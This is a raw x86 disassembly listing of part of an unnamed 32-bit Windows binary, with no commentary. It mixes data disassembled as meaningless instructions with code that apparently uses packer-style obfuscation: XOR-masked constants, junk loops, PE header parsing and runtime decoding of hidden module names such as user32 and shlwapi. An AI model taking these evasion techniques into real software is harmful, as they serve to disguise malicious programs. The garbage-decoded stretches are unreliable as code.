  423c36:	icebp  
  423c37:	cmp    eax,0x2cf30c1e
  423c3c:	mov    WORD PTR [ebp-0x16b30e8f],cs
  423c42:	shl    ah,cl
  423c44:	ror    DWORD PTR [ebp+0x73],cl
  423c47:	les    eax,FWORD PTR [esi]
  423c49:	imul   edx,ebx,0x77d7908f
  423c4f:	cs stos BYTE PTR es:[edi],al
  423c51:	ds cmp al,0xa5
  423c54:	and    BYTE PTR [edi-0x4d],ch
  423c57:	push   ds
  423c58:	sbb    ebx,DWORD PTR [ebp-0x17]
  423c5b:	cmc    
  423c5c:	in     eax,0xe9
  423c5e:	mov    al,ds:0x5160a61c
  423c63:	sbb    DWORD PTR [eax],ebp
  423c65:	js     0x423cb9
  423c67:	mov    bh,0x6f
  423c69:	inc    esi
  423c6a:	sub    edi,DWORD PTR [bp+0x5a]
  423c6e:	sub    bl,BYTE PTR [eax]
  423c70:	sub    eax,0xd3ed9ae4
  423c75:	push   0xeb8e23a5
  423c7a:	int3   
  423c7b:	not    dh
  423c7d:	test   DWORD PTR [ebx-0x1a],edi
  423c80:	hlt    
  423c81:	mov    es,WORD PTR [edi+edi*8]
  423c84:	or     BYTE PTR [esi+0x586ed02a],0x55
  423c8b:	jmp    0xf199:0xe6a74fac
  423c92:	cmc    
  423c93:	mov    ecx,?
  423c95:	add    al,0x1e
  423c97:	mov    edx,0x3bec90ac
  423c9c:	and    DWORD PTR [eax+ebx*8],edx
  423c9f:	xchg   ebp,eax
  423ca0:	fimul  WORD PTR [eax+0x51]
  423ca3:	ror    DWORD PTR [edi],cl
  423ca5:	neg    BYTE PTR [ebp-0x5a34347b]
  423cab:	fsubr  DWORD PTR [ecx+edi*4]
  423cae:	test   BYTE PTR ds:0xdbbdbedb,dh
  423cb4:	or     BYTE PTR [ebp+0x49],bl
  423cb7:	ds cmp dl,al
  423cba:	daa    
  423cbb:	jo     0x423c60
  423cbd:	fs pop ds
  423cbf:	mov    esp,0x1b29301c
  423cc4:	fs ret 0x64ee
  423cc8:	test   DWORD PTR [ebp+0xc],ecx
  423ccb:	aad    0x82
  423ccd:	pop    esi
  423cce:	or     al,0xe2
  423cd0:	test   BYTE PTR [ebp-0x73b803d2],bl
  423cd6:	neg    BYTE PTR [ecx+0xb]
  423cd9:	fldcw  WORD PTR [esi+edi*4]
  423cdc:	fcmovb st,st(5)
  423cde:	imul   esp,DWORD PTR [esi-0x5d9fdc3b],0xfffffff4
  423ce5:	inc    ecx
  423ce6:	fwait
  423ce7:	xor    al,0xb
  423ce9:	mov    al,0x29
  423ceb:	inc    ebp
  423cec:	xor    BYTE PTR [ebp+ebp*8-0x76],ah
  423cf0:	xor    al,0x73
  423cf2:	sbb    DWORD PTR [eax-0x18496855],edx
  423cf8:	stos   BYTE PTR es:[edi],al
  423cf9:	fstp   TBYTE PTR [ebx-0x55717d25]
  423cff:	and    edi,0xafc06080
  423d05:	mov    cl,0x42
  423d07:	mov    bh,0xa9
  423d09:	mov    ds:0x4309e220,al
  423d0e:	mov    edi,0x16a3bf3c
  423d13:	xor    edx,DWORD PTR [edi+0x1f]
  423d16:	out    dx,al
  423d17:	lods   al,BYTE PTR ds:[esi]
  423d18:	cmp    bh,bh
  423d1a:	hlt    
  423d1b:	dec    ebx
  423d1c:	int3   
  423d1d:	cmp    al,0x38
  423d1f:	and    edx,DWORD PTR [edi]
  423d21:	hlt    
  423d22:	cmp    al,0xd2
  423d24:	lods   eax,DWORD PTR ds:[esi]
  423d25:	mov    edi,0x2f255b0c
  423d2a:	sbb    BYTE PTR [edi-0x73],al
  423d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d2e:	sbb    eax,DWORD PTR [esi]
  423d30:	leave  
  423d31:	loope  0x423d79
  423d33:	bound  ecx,QWORD PTR [ecx]
  423d35:	xor    al,0x72
  423d38:	pushf  
  423d39:	pop    edx
  423d3a:	xchg   edx,eax
  423d3b:	js     0x423d7d
  423d3d:	jns    0x423cc1
  423d3f:	push   0xe893a353
  423d44:	adc    dl,dl
  423d46:	shl    BYTE PTR [ebp+ecx*2+0x7b],1
  423d4a:	jle    0x423d57
  423d4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d4d:	rol    BYTE PTR [edx-0x676cdc60],cl
  423d53:	xchg   ebp,eax
  423d54:	ret    0x7077
  423d57:	lods   al,BYTE PTR ds:[esi]
  423d58:	outs   dx,DWORD PTR ds:[esi]
  423d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d5a:	fs ja  0x423d51
  423d5d:	cmp    al,0x8b
  423d5f:	xor    ebp,ebp
  423d61:	iret   
  423d62:	add    DWORD PTR [ebx-0x76f1da6],edx
  423d68:	fwait
  423d69:	es stos DWORD PTR es:[edi],eax
  423d6b:	fldcw  WORD PTR [eax]
  423d6d:	jae    0x423d6c
  423d6f:	(bad)
  423d72:	xor    ebx,DWORD PTR [edi+0x2]
  423d75:	cmp    ebx,DWORD PTR [esi-0x39ab8961]
  423d7b:	pop    eax
  423d7c:	mov    ebx,0x587c8b7e
  423d81:	mov    eax,ds:0xa85927cd
  423d86:	gs rol edi,0xd7
  423d8a:	jo     0x423d16
  423d8c:	cdq    
  423d8d:	or     edx,edi
  423d8f:	icebp  
  423d90:	dec    ecx
  423d91:	sbb    al,0x16
  423d93:	add    al,0xa0
  423d95:	push   ebx
  423d96:	xchg   ecx,eax
  423d97:	xchg   DWORD PTR [ebp-0x68],esp
  423d9a:	shl    DWORD PTR [edx-0x4272ec4],1
  423da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da1:	sbb    BYTE PTR [edi],al
  423da3:	jle    0x423d4b
  423da5:	popf   
  423da6:	(bad)  [ebx]
  423da8:	xor    al,0x55
  423daa:	adc    BYTE PTR [eax+0x6e],dh
  423dad:	pop    DWORD PTR [esi+0x70]
  423db0:	das    
  423db1:	scas   al,BYTE PTR es:[edi]
  423db2:	xchg   edx,eax
  423db3:	pop    eax
  423db4:	sbb    eax,0x3c14db0f
  423db9:	jne    0x423d87
  423dbb:	mul    DWORD PTR [edx]
  423dbd:	and    eax,0x6f3234f4
  423dc2:	add    BYTE PTR [edx-0x48],al
  423dc5:	jne    0x423de4
  423dc7:	sti    
  423dc8:	mov    eax,DWORD PTR [esi-0xc]
  423dcb:	ffree  st(6)
  423dcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423dce:	and    dh,al
  423dd0:	xchg   edx,eax
  423dd1:	push   edi
  423dd2:	(bad)  
  423dd3:	push   edx
  423dd4:	pop    ss
  423dd5:	cld    
  423dd6:	push   0xffffffa5
  423dd8:	pop    edi
  423dd9:	test   DWORD PTR [esi+0x28649678],edi
  423ddf:	add    al,0xf2
  423de1:	mov    edx,0x9e6f241d
  423de6:	pop    esi
  423de7:	aam    0xa8
  423de9:	jb     0x423d6d
  423deb:	xor    esi,ecx
  423ded:	push   edi
  423dee:	fld    QWORD PTR [eax-0x38]
  423df1:	stc    
  423df2:	lods   eax,DWORD PTR ds:[esi]
  423df3:	ret    
  423df4:	mov    edx,0x9aa3d25d
  423df9:	add    DWORD PTR [eax-0x34c910cb],ebp
  423dff:	or     al,0xc6
  423e01:	pop    ds
  423e02:	mov    eax,DWORD PTR [ebp+0x8]
  423e05:	movsx  eax,BYTE PTR [eax]
  423e08:	mov    edx,0x3272f6
  423e0d:	sub    eax,edx
  423e0f:	mov    ecx,0x75108af
  423e14:	xor    eax,ecx
  423e16:	cmp    eax,0xf89c85f8
  423e1b:	mov    DWORD PTR ds:0x428e97,0x5a9f
  423e25:	jne    0x423e8a
  423e2b:	mov    eax,DWORD PTR [ebp+0x8]
  423e2e:	push   esi
  423e2f:	or     DWORD PTR ds:0x428e8b,edx
  423e35:	mov    esi,DWORD PTR [ebp+0x8]
  423e38:	add    esi,DWORD PTR [eax+0x3c]
  423e3b:	sbb    DWORD PTR ds:0x428e23,0x3013
  423e45:	mov    DWORD PTR [ebp+0x8],esi
  423e48:	sbb    DWORD PTR ds:0x428e6b,0x1c7d
  423e52:	mov    eax,DWORD PTR [ebp-0x4]
  423e55:	mov    esi,DWORD PTR ds:0x428e6b
  423e5b:	adc    esi,DWORD PTR ds:0x428e2f
  423e61:	mov    DWORD PTR ds:0x428e6b,esi
  423e67:	mov    esi,DWORD PTR [ebp+0x8]
  423e6a:	adc    DWORD PTR ds:0x428ecf,0x428ea3
  423e74:	xor    eax,ecx
  423e76:	add    eax,edx
  423e78:	cmp    DWORD PTR [esi+0x54],eax
  423e7b:	pop    esi
  423e7c:	je     0x423e8a
  423e82:	mov    eax,DWORD PTR [ebp+0x8]
  423e85:	jmp    0x423e91
  423e8a:	mov    eax,DWORD PTR [ebp-0x4]
  423e8d:	xor    eax,ecx
  423e8f:	add    eax,edx
  423e91:	leave  
  423e92:	ret    0x4
  423e95:	push   ebp
  423e96:	mov    ebp,esp
  423e98:	sub    esp,0xc
  423e9b:	push   esi
  423e9c:	or     DWORD PTR ds:0x428eaf,ebx
  423ea2:	mov    esi,0xf89c85a5
  423ea7:	and    DWORD PTR ds:0x428e97,0x0
  423eb1:	jmp    0x423ec3
  423eb6:	mov    edx,DWORD PTR ds:0x428e97
  423ebc:	inc    edx
  423ebd:	mov    DWORD PTR ds:0x428e97,edx
  423ec3:	cmp    DWORD PTR ds:0x428e97,0x10
  423eca:	jae    0x423f0a
  423ed0:	cmp    DWORD PTR ds:0x428e97,0x8
  423ed7:	jg     0x423f0a
  423edd:	jmp    0x423eeb
  423ee2:	push   DWORD PTR [ebp-0x20]
  423ee5:	call   DWORD PTR ds:0x42aa2b
  423eeb:	cmp    DWORD PTR ds:0x428e97,0x7
  423ef2:	jne    0x423f05
  423ef8:	mov    edx,DWORD PTR ds:0x428e97
  423efe:	inc    edx
  423eff:	mov    DWORD PTR ds:0x428e97,edx
  423f05:	jmp    0x423eb6
  423f0a:	mov    DWORD PTR [ebp-0x8],esi
  423f0d:	and    DWORD PTR ds:0x428e67,0x0
  423f17:	jmp    0x423f29
  423f1c:	mov    edx,DWORD PTR ds:0x428e67
  423f22:	inc    edx
  423f23:	mov    DWORD PTR ds:0x428e67,edx
  423f29:	cmp    DWORD PTR ds:0x428e67,0x1a
  423f30:	jae    0x423f78
  423f36:	cmp    DWORD PTR ds:0x428e67,0x4
  423f3d:	jle    0x423f78
  423f43:	jmp    0x423f59
  423f48:	push   DWORD PTR [ebp-0x18]
  423f4b:	push   0x428e67
  423f50:	push   DWORD PTR [ebp-0x18]
  423f53:	call   DWORD PTR ds:0x42aa2f
  423f59:	cmp    DWORD PTR ds:0x428e67,0x3
  423f60:	jne    0x423f73
  423f66:	mov    edx,DWORD PTR ds:0x428e67
  423f6c:	inc    edx
  423f6d:	mov    DWORD PTR ds:0x428e67,edx
  423f73:	jmp    0x423f1c
  423f78:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  423f7f:	push   edi
  423f80:	adc    DWORD PTR ds:0x428e87,0x34d1
  423f8a:	mov    eax,eax
  423f8c:	mov    eax,DWORD PTR [ebp-0x4]
  423f8f:	movzx  edx,BYTE PTR ds:0x428e97
  423f96:	add    DWORD PTR ds:0x428ecf,edx
  423f9c:	mov    edi,DWORD PTR [ebp-0x8]
  423f9f:	mov    ecx,DWORD PTR ds:0x429737
  423fa5:	mov    ecx,DWORD PTR [ecx]
  423fa7:	sub    DWORD PTR ds:0x428ecb,ecx
  423fad:	mov    ecx,0x75108af
  423fb2:	xor    eax,ecx
  423fb4:	xor    edi,ecx
  423fb6:	mov    edx,0x3272f6
  423fbb:	add    edi,edx
  423fbd:	add    eax,edx
  423fbf:	imul   eax,edi
  423fc2:	mov    edi,DWORD PTR [ebp+0xc]
  423fc5:	cmp    edi,eax
  423fc7:	je     0x42401c
  423fcd:	mov    DWORD PTR [ebp-0xc],esi
  423fd0:	mov    eax,DWORD PTR [ebp-0xc]
  423fd3:	mov    esi,DWORD PTR [ebp+0xc]
  423fd6:	xor    eax,ecx
  423fd8:	lea    eax,[eax*8+0x1939828]
  423fdf:	mov    eax,DWORD PTR [esi+eax*1]
  423fe2:	mov    DWORD PTR [ebp+0xc],eax
  423fe5:	mov    eax,DWORD PTR [ebp-0x4]
  423fe8:	mov    esi,DWORD PTR [ebp-0x8]
  423feb:	xor    eax,ecx
  423fed:	xor    esi,ecx
  423fef:	add    esi,edx
  423ff1:	add    eax,edx
  423ff3:	imul   eax,esi
  423ff6:	mov    esi,DWORD PTR [ebp+0xc]
  423ff9:	cmp    esi,eax
  423ffb:	je     0x42401c
  424001:	mov    eax,DWORD PTR [ebp-0x4]
  424004:	xor    eax,ecx
  424006:	mov    ecx,DWORD PTR [ebp+0xc]
  424009:	add    eax,edx
  42400b:	imul   eax,ecx
  42400e:	add    eax,DWORD PTR [ebp+0x8]
  424011:	mov    DWORD PTR [ebp+0xc],eax
  424014:	mov    eax,DWORD PTR [ebp+0xc]
  424017:	jmp    0x42402d
  42401c:	mov    eax,DWORD PTR [ebp-0x4]
  42401f:	mov    esi,DWORD PTR [ebp-0x8]
  424022:	xor    esi,ecx
  424024:	xor    eax,ecx
  424026:	add    esi,edx
  424028:	add    eax,edx
  42402a:	imul   eax,esi
  42402d:	pop    edi
  42402e:	pop    esi
  42402f:	leave  
  424030:	ret    0x8
	...
  424043:	add    BYTE PTR [ebp-0x44],al
  424046:	mov    edi,0x4d
  42404b:	add    BYTE PTR [edx],al
  42404d:	add    BYTE PTR [eax],al
  42404f:	add    BYTE PTR [ecx+0x0],al
  424052:	add    BYTE PTR [eax],al
  424054:	pusha  
  424055:	inc    eax
  424056:	add    al,BYTE PTR [eax]
  424058:	pusha  
  424059:	xor    al,0x2
  42405b:	add    BYTE PTR [eax],al
  42405d:	add    BYTE PTR [eax],al
  42405f:	add    BYTE PTR [edx+0x53],dl
  424062:	inc    esp
  424063:	push   ebx
  424064:	xchg   ebp,eax
  424065:	mov    eax,0x7ba7ab35
  42406a:	icebp  
  42406b:	dec    ebp
  42406c:	xchg   edi,eax
  42406d:	xlat   BYTE PTR ds:[ebx]
  42406e:	jb     0x424013
  424070:	sete   BYTE PTR [edx+0x168]
  424077:	add    BYTE PTR [ebx+0x3a],al
  42407a:	pop    esp
  42407b:	inc    esi
  42407c:	outs   dx,DWORD PTR ds:[esi]
  42407d:	ins    BYTE PTR es:[edi],dx
  42407e:	fs gs jb 0x4240a2
  424082:	outs   dx,DWORD PTR ds:[esi]
  424083:	data16 and BYTE PTR [edi+0x6f],dl
  424087:	jb     0x4240f4
  424089:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424090:	push   0x65
  424092:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424096:	jb     0x424107
  424098:	push   0x65
  42409a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42409e:	jae    0x424114
  4240a0:	add    BYTE PTR [ebx-0x137e13ab],cl
  4240a6:	or     BYTE PTR [ecx],al
  4240a8:	add    BYTE PTR [eax],al
  4240aa:	push   ebx
  4240ab:	mov    eax,ebx
  4240ad:	xchg   ecx,eax
  4240ae:	mov    eax,DWORD PTR [ebp+0x8]
  4240b1:	cmp    eax,0xf89c85a5
  4240b6:	jne    0x424542
  4240bc:	mov    eax,DWORD PTR [ebp+0xc]
  4240bf:	cmp    eax,0xf89c85a4
  4240c4:	jne    0x424542
  4240ca:	mov    eax,DWORD PTR [ebp+0x24]
  4240cd:	mov    DWORD PTR [ebp-0x4],eax
  4240d0:	mov    eax,DWORD PTR [ebp-0x4]
  4240d3:	mov    eax,DWORD PTR [eax+0x1d8]
  4240d9:	mov    eax,DWORD PTR [eax]
  4240db:	mov    eax,DWORD PTR [eax]
  4240dd:	mov    DWORD PTR [ebp-0x8],eax
  4240e0:	mov    BYTE PTR [ebp-0x18],0x1c
  4240e4:	mov    BYTE PTR [ebp-0x17],0x1f
  4240e8:	mov    BYTE PTR [ebp-0x16],0x1a
  4240ec:	mov    BYTE PTR [ebp-0x15],0x50
  4240f0:	mov    BYTE PTR [ebp-0x14],0x51
  4240f4:	mov    BYTE PTR [ebp-0x13],0x83
  4240f8:	mov    BYTE PTR [ebp-0x20],0xe
  4240fc:	mov    BYTE PTR [ebp-0x1f],0x10
  424100:	mov    BYTE PTR [ebp-0x1e],0x1e
  424104:	mov    BYTE PTR [ebp-0x1d],0x11
  424108:	mov    BYTE PTR [ebp-0x1c],0x50
  42410c:	mov    BYTE PTR [ebp-0x1b],0x51
  424110:	mov    BYTE PTR [ebp-0x1a],0x83
  424114:	mov    BYTE PTR [ebp-0x28],0x10
  424118:	mov    BYTE PTR [ebp-0x27],0x1b
  42411c:	mov    BYTE PTR [ebp-0x26],0x17
  424120:	mov    BYTE PTR [ebp-0x25],0xc
  424124:	mov    BYTE PTR [ebp-0x24],0x22
  424128:	mov    BYTE PTR [ebp-0x23],0x13
  42412c:	mov    BYTE PTR [ebp-0x22],0x1a
  424130:	mov    BYTE PTR [ebp-0x21],0x83
  424134:	xor    ecx,ecx
  424136:	lea    eax,[ebp+ecx*1-0x18]
  42413a:	movzx  edx,BYTE PTR [eax]
  42413d:	xor    edx,0x7f
  424140:	add    edx,0x4
  424143:	inc    ecx
  424144:	mov    BYTE PTR [eax],dl
  424146:	cmp    ecx,0x6
  424149:	jb     0x424136
  42414b:	xor    ecx,ecx
  42414d:	lea    eax,[ebp+ecx*1-0x20]
  424151:	movzx  edx,BYTE PTR [eax]
  424154:	xor    edx,0x7f
  424157:	add    edx,0x4
  42415a:	inc    ecx
  42415b:	mov    BYTE PTR [eax],dl
  42415d:	cmp    ecx,0x7
  424160:	jb     0x42414d
  424162:	xor    ecx,ecx
  424164:	lea    eax,[ebp+ecx*1-0x28]
  424168:	movzx  edx,BYTE PTR [eax]
  42416b:	xor    edx,0x7f
  42416e:	add    edx,0x4
  424171:	inc    ecx
  424172:	mov    BYTE PTR [eax],dl
  424174:	cmp    ecx,0x8
  424177:	jb     0x424164
  424179:	lea    eax,[ebp-0x2c]
  42417c:	mov    DWORD PTR [ebp-0x8],eax
  42417f:	mov    ecx,DWORD PTR [ebp-0x8]
  424182:	mov    eax,0x7113fccf
  424187:	push   esi
  424188:	mov    DWORD PTR [ecx],eax
  42418a:	mov    ecx,DWORD PTR [ebp-0x2c]
  42418d:	mov    esi,0x4e38
  424192:	push   edi
  424193:	lea    edi,[esi-0x6]
  424196:	mov    ebx,0x3272f6
  42419b:	cmp    ecx,eax
  42419d:	jne    0x42426e
  4241a3:	lea    eax,[esi+0x3f]
  4241a6:	mov    WORD PTR [ebp-0x78],ax
  4241aa:	mov    eax,esi
  4241ac:	mov    WORD PTR [ebp-0x76],ax
  4241b0:	add    eax,0x45
  4241b3:	mov    WORD PTR [ebp-0x74],ax
  4241b7:	lea    eax,[esi+0x6]
  4241ba:	mov    WORD PTR [ebp-0x72],ax
  4241be:	add    eax,0x41
  4241c1:	mov    WORD PTR [ebp-0x70],ax
  4241c5:	mov    eax,edi
  4241c7:	mov    WORD PTR [ebp-0x6e],ax
  4241cb:	mov    eax,0x4f94
  4241d0:	mov    WORD PTR [ebp-0x6c],ax
  4241d4:	lea    eax,[esi-0x7]
  4241d7:	mov    WORD PTR [ebp-0x6a],ax
  4241db:	add    eax,0x30
  4241de:	mov    WORD PTR [ebp-0x68],ax
  4241e2:	lea    eax,[esi-0x3]
  4241e5:	mov    WORD PTR [ebp-0x66],ax
  4241e9:	mov    eax,esi
  4241eb:	mov    WORD PTR [ebp-0x64],ax
  4241ef:	add    eax,0xfffffffc
  4241f2:	mov    WORD PTR [ebp-0x62],ax
  4241f6:	mov    eax,0x443
  4241fb:	mov    WORD PTR [ebp-0x60],ax
  4241ff:	mov    eax,0x5672
  424204:	mov    WORD PTR [ebp-0x5e],ax
  424208:	mov    eax,0x6112
  42420d:	mov    WORD PTR [ebp-0x5c],ax
  424211:	mov    eax,0xf1e0
  424216:	mov    WORD PTR [ebp-0x5a],ax
  42421a:	mov    eax,edi
  42421c:	mov    WORD PTR [ebp-0x58],ax
  424220:	lea    eax,[ebp-0xe0]
  424226:	push   eax
  424227:	mov    eax,DWORD PTR [ebp+0xc]
  42422a:	xor    eax,0x75108af
  42422f:	add    eax,ebx
  424231:	push   eax
  424232:	lea    eax,[ebp-0x78]
  424235:	push   eax
  424236:	mov    eax,DWORD PTR [ebp-0x4]
  424239:	mov    eax,DWORD PTR [eax+0x198]
  42423f:	mov    DWORD PTR [ebp-0xe0],0x1
  424249:	mov    DWORD PTR [ebp-0xdc],0xffff
  424253:	push   DWORD PTR [eax]
  424255:	mov    eax,DWORD PTR [ebp+0x10]
  424258:	call   eax
  42425a:	mov    DWORD PTR [ebp-0x8],eax
  42425d:	mov    eax,DWORD PTR [ebp-0x8]
  424260:	test   eax,eax
  424262:	je     0x42426e
  424264:	xor    DWORD PTR ds:0xe041cc1,0x9f170bd0
  42426e:	mov    eax,DWORD PTR [ebp-0x4]
  424271:	mov    ecx,DWORD PTR [eax+0x18c]
  424277:	xor    eax,eax
  424279:	cmp    DWORD PTR [ecx],eax
  42427b:	jne    0x4244b2
  424281:	mov    ecx,DWORD PTR [ebp-0x4]
  424284:	mov    ecx,DWORD PTR [ecx+0x17c]
  42428a:	mov    DWORD PTR [ecx],eax
  42428c:	mov    ecx,DWORD PTR [ebp-0x4]
  42428f:	mov    ecx,DWORD PTR [ecx+0x180]
  424295:	mov    DWORD PTR [ecx],eax
  424297:	mov    eax,0x4e6d
  42429c:	mov    WORD PTR [ebp-0x9c],ax
  4242a3:	mov    eax,esi
  4242a5:	mov    WORD PTR [ebp-0x9a],ax
  4242ac:	mov    eax,0x4e7d
  4242b1:	mov    WORD PTR [ebp-0x98],ax
  4242b8:	add    eax,0xffffffc0
  4242bb:	mov    WORD PTR [ebp-0x96],ax
  4242c2:	mov    eax,0x4f88
  4242c7:	mov    WORD PTR [ebp-0x94],ax
  4242ce:	mov    eax,0x4e3c
  4242d3:	mov    WORD PTR [ebp-0x92],ax
  4242da:	mov    eax,esi
  4242dc:	mov    WORD PTR [ebp-0x8c],ax
  4242e3:	mov    eax,0x4e31
  4242e8:	mov    WORD PTR [ebp-0x8a],ax
  4242ef:	mov    eax,0x99fd
  4242f4:	mov    WORD PTR [ebp-0x88],ax
  4242fb:	mov    eax,0x8d6c
  424300:	mov    WORD PTR [ebp-0x86],ax
  424307:	mov    eax,0xd66f
  42430c:	mov    WORD PTR [ebp-0x84],ax
  424313:	mov    BYTE PTR [ebp-0x10],0x10
  424317:	mov    eax,0xd783
  42431c:	mov    WORD PTR [ebp-0x82],ax
  424323:	mov    BYTE PTR [ebp-0xf],0x1b
  424327:	mov    eax,0x2782
  42432c:	mov    BYTE PTR [ebp-0xe],0x17
  424330:	mov    WORD PTR [ebp-0x80],ax
  424334:	mov    BYTE PTR [ebp-0xd],0xc
  424338:	mov    eax,0x4782
  42433d:	mov    BYTE PTR [ebp-0xc],0x22
  424341:	mov    WORD PTR [ebp-0x7e],ax
  424345:	mov    eax,0x4e33
  42434a:	mov    BYTE PTR [ebp-0xb],0x13
  42434e:	push   0x8
  424350:	mov    BYTE PTR [ebp-0xa],0x1a
  424354:	mov    WORD PTR [ebp-0x7c],ax
  424358:	mov    BYTE PTR [ebp-0x9],0x83
  42435c:	mov    DWORD PTR [ebp-0x90],0x4e324e61
  424366:	lea    eax,[ebp-0x10]
  424369:	pop    edi
  42436a:	movzx  ecx,BYTE PTR [eax]
  42436d:	xor    ecx,0x7f
  424370:	add    ecx,0x4
  424373:	mov    BYTE PTR [eax],cl
  424375:	inc    eax
  424376:	dec    edi
  424377:	jne    0x42436a
  424379:	mov    DWORD PTR [ebp-0xe0],0x1
  424383:	lea    eax,[ebp-0x10]
  424386:	mov    DWORD PTR [ebp-0xdc],eax
  42438c:	mov    ecx,0x4e60
  424391:	mov    eax,ecx
  424393:	mov    WORD PTR [ebp-0x40],ax
  424397:	add    eax,0xb
  42439a:	mov    edx,eax
  42439c:	mov    WORD PTR [ebp-0x3e],dx
  4243a0:	mov    edx,0x4f93
  4243a5:	mov    WORD PTR [ebp-0x3c],dx
  4243a9:	add    edx,0xfffffff8
  4243ac:	mov    WORD PTR [ebp-0x3a],dx
  4243b0:	mov    edx,0x4f89
  4243b5:	mov    WORD PTR [ebp-0x38],dx
  4243b9:	add    edx,0x5
  4243bc:	mov    WORD PTR [ebp-0x36],dx
  4243c0:	mov    edx,0x4f87
  4243c5:	mov    WORD PTR [ebp-0x34],dx
  4243c9:	mov    WORD PTR [ebp-0x32],cx
  4243cd:	mov    ecx,esi
  4243cf:	mov    WORD PTR [ebp-0x30],cx
  4243d3:	lea    ecx,[edx-0x7]
  4243d6:	mov    edx,ecx
  4243d8:	mov    WORD PTR [ebp-0x54],dx
  4243dc:	mov    edx,eax
  4243de:	mov    WORD PTR [ebp-0x52],dx
  4243e2:	mov    edx,0x4e73
  4243e7:	mov    WORD PTR [ebp-0x50],dx
  4243eb:	mov    WORD PTR [ebp-0x4e],ax
  4243ef:	lea    eax,[edx-0xa]
  4243f2:	mov    WORD PTR [ebp-0x4c],ax
  4243f6:	add    eax,0x5
  4243f9:	mov    WORD PTR [ebp-0x4a],ax
  4243fd:	lea    eax,[edx-0xc]
  424400:	mov    WORD PTR [ebp-0x48],ax
  424404:	mov    WORD PTR [ebp-0x46],cx
  424408:	mov    WORD PTR [ebp-0x44],si
  42440c:	mov    ecx,DWORD PTR [ebp+0x8]
  42440f:	movzx  edx,WORD PTR [ebp-0x54]
  424413:	mov    eax,0x75108af
  424418:	xor    ecx,eax
  42441a:	add    ecx,ebx
  42441c:	xor    ecx,edx
  42441e:	mov    WORD PTR [ebp-0x54],cx
  424422:	mov    ecx,DWORD PTR [ebp+0x8]
  424425:	xor    ecx,eax
  424427:	movzx  eax,WORD PTR [ebp-0x40]
  42442b:	add    ecx,ebx
  42442d:	xor    ecx,eax
  42442f:	xor    eax,eax
  424431:	mov    WORD PTR [ebp-0x40],cx
  424435:	mov    WORD PTR [ebp-0xf4],ax
  42443c:	mov    WORD PTR [ebp-0x108],ax
  424443:	mov    edi,DWORD PTR [ebp+0x24]
  424446:	lea    eax,[ebp-0xf4]
  42444c:	lea    edx,[ebp-0x54]
  42444f:	mov    DWORD PTR [ebp-0xe0],0x2
  424459:	mov    DWORD PTR [ebp-0xdc],eax
  42445f:	call   0x426ea1
  424464:	mov    ecx,DWORD PTR [ebp+0x8]
  424467:	mov    DWORD PTR [ebp-0xd8],eax
  42446d:	mov    eax,0x75108af
  424472:	xor    ecx,eax
  424474:	add    ecx,ebx
  424476:	je     0x424495
  424478:	lea    ecx,[ebp-0xe0]
  42447e:	push   ecx
  42447f:	mov    ecx,DWORD PTR [ebp+0xc]
  424482:	xor    ecx,eax
  424484:	add    ecx,ebx
  424486:	push   ecx
  424487:	lea    eax,[ebp-0x9c]
  42448d:	push   eax
  42448e:	mov    eax,DWORD PTR [ebp+0x10]
  424491:	push   0x0
  424493:	call   eax
  424495:	mov    edi,DWORD PTR [ebp+0x24]
  424498:	lea    eax,[ebp-0x108]
  42449e:	lea    edx,[ebp-0x40]
  4244a1:	mov    DWORD PTR [ebp-0xdc],eax
  4244a7:	call   0x426ea1
  4244ac:	mov    DWORD PTR [ebp-0xd8],eax
  4244b2:	mov    eax,DWORD PTR [ebp+0x14]
  4244b5:	push   DWORD PTR [ebp-0x4]
  4244b8:	push   DWORD PTR [ebp+0x20]
  4244bb:	push   DWORD PTR [ebp+0x1c]
  4244be:	push   DWORD PTR [ebp+0x18]
  4244c1:	push   DWORD PTR [ebp+0x10]
  4244c4:	push   DWORD PTR [ebp+0x8]
  4244c7:	push   DWORD PTR [ebp+0xc]
  4244ca:	call   0x425742
  4244cf:	test   eax,eax
  4244d1:	je     0x424518
  4244d3:	add    DWORD PTR [ebp-0x4],eax
  4244d6:	push   DWORD PTR [ebp-0x4]
  4244d9:	lea    esi,[ebp+0x4]
  4244dc:	call   0x424930
  4244e1:	mov    eax,DWORD PTR [ebp-0x4]
  4244e4:	mov    eax,DWORD PTR [eax+0x1c8]
  4244ea:	mov    eax,DWORD PTR [eax]
  4244ec:	xor    eax,0x75108af
  4244f1:	add    eax,ebx
  4244f3:	mov    eax,DWORD PTR [ebp-0x4]
  4244f6:	jne    0x42450e
  4244f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4244fb:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424501:	push   DWORD PTR [ecx]
  424503:	mov    eax,DWORD PTR [eax+0x1e0]
  424509:	call   DWORD PTR [eax+0x28]
  42450c:	jmp    0x424518
  42450e:	mov    eax,DWORD PTR [eax+0x17c]
  424514:	mov    eax,DWORD PTR [eax]
  424516:	add    DWORD PTR [esi],eax
  424518:	mov    eax,DWORD PTR [ebp-0x4]
  42451b:	mov    eax,DWORD PTR [eax+0x1dc]
  424521:	dec    DWORD PTR [eax]
  424523:	mov    ecx,DWORD PTR [ebp-0x4]
  424526:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42452c:	mov    eax,DWORD PTR [eax]
  42452e:	lea    eax,[ecx+eax*4]
  424531:	mov    ecx,DWORD PTR [ebp-0x4]
  424534:	mov    ecx,DWORD PTR [ecx+0x17c]
  42453a:	mov    eax,DWORD PTR [eax]
  42453c:	mov    ecx,DWORD PTR [ecx]
  42453e:	add    DWORD PTR [eax],ecx
  424540:	pop    edi
  424541:	pop    esi
  424542:	pop    ebx
  424543:	leave  
  424544:	ret    0x20
  424547:	push   edi
  424548:	push   esi
  424549:	push   ebx
  42454a:	push   ebp
  42454b:	mov    ebp,esp
  42454d:	mov    eax,DWORD PTR [ebp+0x24]
  424550:	add    DWORD PTR [ebp+0x28],eax
  424553:	push   eax
  424554:	cld    
  424555:	mov    esi,DWORD PTR [ebp+0x18]
